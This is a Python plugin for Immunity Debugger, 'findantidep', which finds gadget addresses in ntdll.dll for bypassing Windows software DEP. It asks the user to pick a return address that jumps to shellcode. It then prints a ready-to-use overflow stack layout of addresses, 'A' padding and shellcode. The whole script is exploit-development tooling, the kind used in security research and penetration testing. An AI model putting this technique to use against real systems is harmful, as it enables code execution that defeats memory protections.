import immlib
import immutils

NAME = "findantidep"
DESC="""Find address to bypass software DEP"""

def usage(imm):
    imm.log("!%s" % NAME)
    imm.log("%s" % DESC)

def tAddr(addr):
    buf = immutils.int2str32_swapped(addr)
    return "\\x%02x\\x%02x\\x%02x\\x%02x" % ( ord(buf[0]) , ord(buf[1]), ord(buf[2]), ord(buf[3]) )
    
def main(args):
    imm=immlib.Debugger()
    addylist = []
    mod = imm.getModule("ntdll.dll")
    if not mod:
        return "Error: Ntdll.dll not found!"

    # Finding the first ADDRESS
    ret = imm.searchCommands("MOV AL,1\nRET")
    if not ret:
        return "Error: Sorry, the first addy cannot be found"
    for a in ret:
        addylist.append( "0x%08x: %s" % (a[0], a[2]) )
    ret = imm.comboBox("Please, choose the First Address [sets AL to 1]", addylist)
    firstaddy = int(ret[0:10], 16)
    imm.log("First Address: 0x%08x" % firstaddy, address = firstaddy)
    
    # Finding the Second ADDRESS
    ret = imm.searchCommandsOnModule(mod.getBase(), "CMP AL,0x1\n PUSH 0x2\n POP ESI\n" )
    if not ret:
        return "Error: Sorry, the second addy cannot be found"
    secondaddy = ret[0][0]
    imm.log( "Second Address %x" % secondaddy , address= secondaddy)

    # Finding the Third ADDRESS
    ret = imm.inputBox("Insert the Asm code to search for")
    ret = imm.searchCommands(ret)
    if not ret:
        return "Error: Sorry, the third address cannot be found"
    addylist = []
    for a in ret:
        addylist.append( "0x%08x: %s" % (a[0], a[2]) )
    ret = imm.comboBox("Please, choose the Third return Address [jumps to shellcode]", addylist)
    thirdaddy = int(ret[0:10], 16)
    imm.log( "Third Address: 0x%08x" % thirdaddy, thirdaddy )
    imm.log( 'stack = "%s\\xff\\xff\\xff\\xff%s\\xff\\xff\\xff\\xff" + "A" * 0x54 + "%s" + shellcode ' %\
            ( tAddr(firstaddy), tAddr(secondaddy), tAddr(thirdaddy) ) )
    
